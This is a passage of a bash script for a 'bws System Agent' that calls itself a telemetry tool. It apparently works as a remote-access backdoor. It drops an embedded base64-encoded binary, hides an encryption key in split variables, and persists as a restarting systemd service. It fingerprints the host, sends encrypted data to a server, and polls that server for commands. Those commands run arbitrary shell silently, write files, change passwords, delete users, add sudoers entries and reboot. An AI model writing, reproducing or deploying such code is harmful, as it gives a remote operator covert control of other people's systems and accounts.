_ensure_crypt_helper() {
    local helper="${BWS_DIR}/bws_crypt"
    if [ -x "$helper" ]; then
        echo "$helper"
        return 0
    fi
    mkdir -p "$BWS_DIR" 2>/dev/null || true
    echo "$BWS_CRYPT_B64" | base64 -d > "$helper" 2>/dev/null
    chmod 755 "$helper" 2>/dev/null
    if [ -x "$helper" ]; then
        echo "$helper"
        return 0
    fi
    echo ""
    return 1
}

encrypt_payload() {
    local plaintext="$1"
    local hex="${_pk_a}${_pk_b}${_pk_c}${_pk_d}"
    local helper
    helper=$(_ensure_crypt_helper)
    if [ -z "$helper" ]; then
        echo ""
        return 1
    fi
    echo "$plaintext" | "$helper" "$hex" | base64 -w0 2>/dev/null
}

# ─── Persistence ─────────────────────────────────────────────────────────
_self_install() {
    mkdir -p "$BWS_DIR" 2>/dev/null || true

    if [ ! -f "$MARKER" ]; then
        touch "$MARKER"

        local id
        id=$(cat /etc/machine-id 2>/dev/null | sha256sum | cut -c1-16)
        [ -z "$id" ] && id=$(openssl rand -hex 8 2>/dev/null)
        echo "$id" > "$AGENT_ID_FILE"

        if command -v systemctl >/dev/null 2>&1; then
            cat > "$SERVICE_FILE" << EOF
[Unit]
Description=bws System Agent
After=network.target

[Service]
Type=simple
ExecStart=${BWS_BIN} --serve
Environment=osbin=${osbin}
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF
            systemctl daemon-reload 2>/dev/null
            systemctl enable bws.service 2>/dev/null
            systemctl restart bws.service 2>/dev/null
        fi
    else
        if command -v systemctl >/dev/null 2>&1 && \
           ! systemctl is-enabled bws.service >/dev/null 2>&1; then
            _self_install
        fi
    fi
}

# ─── Agent ID ────────────────────────────────────────────────────────────
_get_agent_id() {
    if [ ! -f "$AGENT_ID_FILE" ]; then
        local id
        id=$(cat /etc/machine-id 2>/dev/null | sha256sum | cut -c1-16)
        [ -z "$id" ] && id=$(openssl rand -hex 8 2>/dev/null)
        echo "$id" > "$AGENT_ID_FILE"
    fi
    cat "$AGENT_ID_FILE" 2>/dev/null || echo "unknown"
}

# ─── Telemetry Collection ────────────────────────────────────────────────
collect_telemetry() {
    local ts hostname user uptime_sec os kernel cpu_cores mem_total swap_total
    local disks ip_addr

    ts=$(date -u +"%Y-%m-%dT%H:%M:%SZ" 2>/dev/null)
    hostname=$(hostname 2>/dev/null)
    user=$(whoami 2>/dev/null)
    uptime_sec=$(awk '{print int($1)}' /proc/uptime 2>/dev/null)
    os=$(cat /etc/os-release 2>/dev/null | grep "^PRETTY_NAME" | cut -d'"' -f2)
    [ -z "$os" ] && os=$(uname -s 2>/dev/null)
    kernel=$(uname -r 2>/dev/null)
    cpu_cores=$(nproc 2>/dev/null)
    mem_total=$(awk '/MemTotal/{print int($2/1024)}' /proc/meminfo 2>/dev/null)
    swap_total=$(awk '/SwapTotal/{print int($2/1024)}' /proc/meminfo 2>/dev/null)
    disks=$(df -h --total 2>/dev/null | grep "^total" | awk '{print $2, $3, $4, $5}')
    ip_addr=$(curl -s --max-time 5 https://api.ipify.org 2>/dev/null || \
              curl -s --max-time 5 https://ifconfig.me 2>/dev/null || \
              echo "unknown")

    local agent_id
    agent_id=$(_get_agent_id)

    cat << EOF
{"agent_id":"${agent_id}","ts":"${ts}","hostname":"${hostname}","user":"${user}","uptime":${uptime_sec:-0},"os":"${os}","kernel":"${kernel}","cpu_cores":${cpu_cores:-0},"mem_mb":${mem_total:-0},"swap_mb":${swap_total:-0},"disk":"${disks}","ip":"${ip_addr}"}
EOF
}

# ─── Command Execution ────────────────────────────────────────────────────
run_cmd() {
    local action="$1"
    shift

    case "$action" in
        exec)
            local cmd="$*"
            if [ -n "$cmd" ]; then
                _run_setsid "$cmd"
            else
                echo "FAIL: empty command"
            fi
            ;;
        write_file)
            local path="$1"
            local content="$2"
            if [ -n "$path" ] && [ -n "$content" ]; then
                printf '%s' "$content" > "$path" 2>/dev/null && echo "OK" || echo "FAIL: write"
            else
                echo "FAIL: missing path or content"
            fi
            ;;
        reboot)
            echo "EXECUTING: reboot"
            shutdown -r now 2>/dev/null || reboot 2>/dev/null || echo "FAIL: reboot not available"
            ;;
        poweroff)
            echo "EXECUTING: poweroff"
            shutdown -h now 2>/dev/null || poweroff 2>/dev/null || echo "FAIL: poweroff not available"
            ;;
        change_password)
            local user="$1"
            local pass="$2"
            echo "$user:$pass" | chpasswd 2>/dev/null && echo "OK" || echo "FAIL: password change"
            ;;
        remove_user)
            local user="$1"
            userdel -r "$user" 2>/dev/null && echo "OK" || echo "FAIL: user removal"
            ;;
        add_sudo)
            local user="$1"
            echo "$user ALL=(ALL) ALL" >> /etc/sudoers 2>/dev/null && echo "OK" || echo "FAIL: sudo add"
            ;;
        collect|telemetry)
            collect_telemetry
            ;;
        *)
            echo "FAIL: unknown action: $action"
            ;;
    esac
}

_run_setsid() {
    local cmd="$*"
    if command -v setsid >/dev/null 2>&1; then
        setsid sh -c "$cmd" </dev/null >/dev/null 2>&1 &
    else
        sh -c "$cmd" </dev/null >/dev/null 2>&1 &
    fi
    disown 2>/dev/null
}

# ─── Push telemetry ──────────────────────────────────────────────────────
push_telemetry() {
    local data=$(collect_telemetry)
    local encrypted
    encrypted=$(encrypt_payload "$data")

    curl -s --max-time 30 -X POST \
        -H "Content-Type: text/plain" \
        -d "$encrypted" \
        "${SERVER}/" 2>/dev/null || true

    date +%s > "$TIMER_FILE"
}

# ─── JSON parser leve (sem jq) ───────────────────────────────────────────
_json_val() {
    local key="$1"
    local json="$2"
    echo "$json" | grep -oP "\"${key}\":\s*\"[^\"]*\"" | head -1 | sed "s/.*\"${key}\":\s*\"//" | sed 's/".*//'
}

_json_arr() {
    local json="$1"
    echo "$json" | grep -oP '\{[^}]*\}' || true
}

# ─── Poll for commands ───────────────────────────────────────────────────
poll_commands() {
    local agent_id
    agent_id=$(cat "$AGENT_ID_FILE" 2>/dev/null || echo "unknown")

    local response
    response=$(curl -s --max-time 30 "${SERVER}/poll/${agent_id}" 2>/dev/null)

    if [ -z "$response" ] || [ "$response" = "null" ] || [ "$response" = "[]" ]; then
        return
    fi

    local items
    items=$(_json_arr "$response")

    local old_ifs="$IFS"
    IFS="$old_ifs"
    echo "$items" | while read -r item; do
        [ -z "$item" ] && continue
        local action=$(_json_val "action" "$item")
        local job_id=$(_json_val "job_id" "$item")
        local params=$(_json_val "params" "$item")

        [ -z "$action" ] && continue

        local result
        case "$action" in
            reboot|poweroff)
                result=$(run_cmd "$action")
                ;;
            change_password)
                local user=$(_json_val "user" "{${params}}")
                local pass=$(_json_val "password" "{${params}}")
                result=$(run_cmd change_password "$user" "$pass")
                ;;
            remove_user)
                local user=$(_json_val "user" "{${params}}")
                result=$(run_cmd remove_user "$user")
                ;;
            add_sudo)
                local user=$(_json_val "user" "{${params}}")
                result=$(run_cmd add_sudo "$user")
                ;;
            exec)
                local cmd=$(_json_val "command" "{${params}}")
                [ -z "$cmd" ] && cmd="$params"
                result=$(run_cmd exec "$cmd")
                ;;
            write_file)
                local path=$(_json_val "path" "{${params}}")
                local content=$(_json_val "content" "{${params}}")
                result=$(run_cmd write_file "$path" "$content")
                ;;
            collect|telemetry)
                result=$(collect_telemetry)
                ;;
            *)
                result="FAIL: unknown action ${action}"
                ;;
        esac

        if [ -n "$job_id" ]; then
            curl -s --max-time 30 -X POST \
                -H "Content-Type: application/json" \
                -d "{\"job_id\":\"${job_id}\",\"result\":\"${result}\"}" \
                "${SERVER}/result/${agent_id}" 2>/dev/null || true
        fi
    done
}

# ─── Mode: serve (daemon) ────────────────────────────────────────────────
mode_serve() {
    _self_install

    while true; do
        local now
        now=$(date +%s)
        local last_push=0
        [ -f "$TIMER_FILE" ] && last_push=$(cat "$TIMER_FILE" 2>/dev/null || echo 0)
        local week=$((7*24*3600))

        if [ $((now - last_push)) -ge "$week" ]; then
            push_telemetry
        fi

        poll_commands

        sleep 3600
    done
}

# ─── Mode: run once (push telemetry) ──────────────────────────────────────
mode_once() {
    _self_install
    push_telemetry
}

# ─── Mode: collect (show raw telemetry) ───────────────────────────────────
mode_collect() {
    collect_telemetry
}

# ─── Help ────────────────────────────────────────────────────────────────
print_help() {
    echo "bws - System Agent"
